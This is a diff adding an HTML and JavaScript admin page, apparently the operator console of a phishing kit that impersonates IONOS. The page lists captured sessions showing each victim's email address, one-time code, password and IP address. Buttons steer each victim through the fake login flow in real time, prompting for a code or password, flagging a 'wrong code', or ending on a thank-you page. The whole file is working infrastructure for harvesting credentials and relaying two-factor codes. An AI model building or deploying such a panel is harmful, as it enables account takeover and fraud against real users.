@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IONOS Flow Panel</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; font-family: system-ui, sans-serif;
+      background: #0f1419; color: #e7ecf3; min-height: 100vh;
+    }
+    .wrap { max-width: 960px; margin: 0 auto; padding: 24px 16px 48px; }
+    h1 { font-size: 1.4rem; margin: 0 0 8px; }
+    .sub { color: #8b949e; font-size: 0.875rem; margin-bottom: 24px; }
+    .auth {
+      background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+      padding: 20px; max-width: 360px;
+    }
+    .auth input {
+      width: 100%; padding: 10px 12px; border-radius: 6px;
+      border: 1px solid #30363d; background: #0d1117; color: #e7ecf3;
+      font-size: 14px; margin-bottom: 12px;
+    }
+    .auth button, .btn {
+      appearance: none; border: none; border-radius: 6px;
+      padding: 8px 14px; font-size: 13px; font-weight: 600;
+      cursor: pointer; color: #fff; background: #003d8f;
+    }
+    .btn-sm { padding: 6px 10px; font-size: 12px; margin: 2px; }
+    .btn-bad { background: #8b2c2c; }
+    .btn-ok { background: #1a7f37; }
+    .btn-muted { background: #30363d; }
+    .session {
+      background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+      padding: 16px; margin-bottom: 12px;
+    }
+    .session.pending { border-color: #1474c4; }
+    .session-head { display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap; margin-bottom: 10px; }
+    .session-id { font-family: monospace; color: #79c0ff; font-size: 13px; }
+    .badge {
+      display: inline-block; font-size: 11px; font-weight: 700;
+      padding: 3px 8px; border-radius: 999px; background: #238636; color: #fff;
+    }
+    .badge.wait { background: #9e6a03; }
+    .meta { font-size: 13px; color: #8b949e; line-height: 1.7; margin-bottom: 12px; }
+    .meta strong { color: #c9d1d9; }
+    .actions { display: flex; flex-wrap: wrap; gap: 4px; }
+    .toolbar { display: flex; gap: 8px; margin-bottom: 16px; align-items: center; }
+    .empty { color: #8b949e; padding: 32px; text-align: center; }
+    #status { font-size: 12px; color: #8b949e; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>IONOS Flow Panel</h1>
+    <p class="sub">Steuere wohin jeder User weitergeleitet wird.</p>
+
+    <div id="auth-box" class="auth">
+      <input type="password" id="admin-key" placeholder="Admin key (ADMIN_KEY aus .env)" />
+      <button type="button" id="auth-btn">Anmelden</button>
+    </div>
+
+    <div id="panel" hidden>
+      <div class="toolbar">
+        <button type="button" class="btn btn-muted" id="refresh-btn">Aktualisieren</button>
+        <span id="status"></span>
+      </div>
+      <div id="sessions"></div>
+    </div>
+  </div>
+
+  <script>
+    const KEY_STORAGE = "ionos_admin_key";
+
+    function getKey() {
+      return sessionStorage.getItem(KEY_STORAGE) || "";
+    }
+
+    function setKey(k) {
+      sessionStorage.setItem(KEY_STORAGE, k);
+    }
+
+    async function api(path, options) {
+      const res = await fetch(path, {
+        ...options,
+        headers: {
+          "Content-Type": "application/json",
+          "X-Admin-Key": getKey(),
+          ...(options && options.headers),
+        },
+      });
+      if (res.status === 401) {
+        document.getElementById("panel").hidden = true;
+        document.getElementById("auth-box").hidden = false;
+        throw new Error("Unauthorized");
+      }
+      return res.json();
+    }
+
+    function renderSessions(list) {
+      const box = document.getElementById("sessions");
+      if (!list.length) {
+        box.innerHTML = '<p class="empty">Keine aktiven Sessions.</p>';
+        return;
+      }
+
+      box.innerHTML = list.map(function (s) {
+        const pending = s.pending ? '<span class="badge wait">WARTET</span>' : '<span class="badge">idle</span>';
+        let actions = "";
+
+        if (s.pending === "email") {
+          actions =
+            '<button class="btn btn-sm" data-id="' + s.id + '" data-action="code">📧 E-Mail Code</button>' +
+            '<button class="btn btn-sm" data-id="' + s.id + '" data-action="password">🔑 Passwort</button>';
+        } else if (s.pending === "code") {
+          actions =
+            '<button class="btn btn-sm btn-ok" data-id="' + s.id + '" data-action="password">✅ Code OK → Passwort</button>' +
+            '<button class="btn btn-sm btn-bad" data-id="' + s.id + '" data-action="code_bad">❌ Falscher Code</button>' +
+            '<button class="btn btn-sm" data-id="' + s.id + '" data-action="thankyou">🎉 Thank You</button>';
+        } else if (s.pending === "password") {
+          actions =
+            '<button class="btn btn-sm" data-id="' + s.id + '" data-action="thankyou">🎉 Thank You</button>';
+        } else {
+          actions = '<span class="meta">Keine Aktion nötig</span>';
+        }
+
+        return (
+          '<div class="session' + (s.pending ? " pending" : "") + '">' +
+            '<div class="session-head">' +
+              '<span class="session-id">' + s.id + '</span>' + pending +
+            '</div>' +
+            '<div class="meta">' +
+              '<strong>Email:</strong> ' + (s.email || "—") + '<br>' +
+              (s.code ? '<strong>Code:</strong> ' + s.code + '<br>' : "") +
+              (s.password ? '<strong>Passwort:</strong> ' + s.password + '<br>' : "") +
+              '<strong>Schritt:</strong> ' + s.step + '<br>' +
+              '<strong>IP:</strong> ' + s.ip +
+            '</div>' +
+            '<div class="actions">' + actions + '</div>' +
+          '</div>'
+        );
+      }).join("");
+
+      box.querySelectorAll("[data-action]").forEach(function (btn) {
+        btn.addEventListener("click", async function () {
+          const id = btn.getAttribute("data-id");
+          const action = btn.getAttribute("data-action");
+          btn.disabled = true;
+          await api("/api/admin/session/" + id + "/redirect", {
+            method: "POST",
+            body: JSON.stringify({ action }),
+          });
+          loadSessions();
+        });
+      });
+    }
+
+    async function loadSessions() {
+      document.getElementById("status").textContent = "Laden…";
+      const data = await api("/api/admin/sessions");
+      renderSessions(data.sessions || []);
+      document.getElementById("status").textContent = "Aktualisiert " + new Date().toLocaleTimeString();
+    }
+
+    document.getElementById("auth-btn").addEventListener("click", function () {
+      const key = document.getElementById("admin-key").value.trim();
+      if (!key) return;
+      setKey(key);
+      document.getElementById("auth-box").hidden = true;
+      document.getElementById("panel").hidden = false;
+      loadSessions();
+      setInterval(loadSessions, 3000);
+    });
+
+    document.getElementById("refresh-btn").addEventListener("click", loadSessions);
+
+    if (getKey()) {
+      document.getElementById("auth-box").hidden = true;
+      document.getElementById("panel").hidden = false;
+      loadSessions();
+      setInterval(loadSessions, 3000);
+    }
+  </script>
+</body>
+</html>
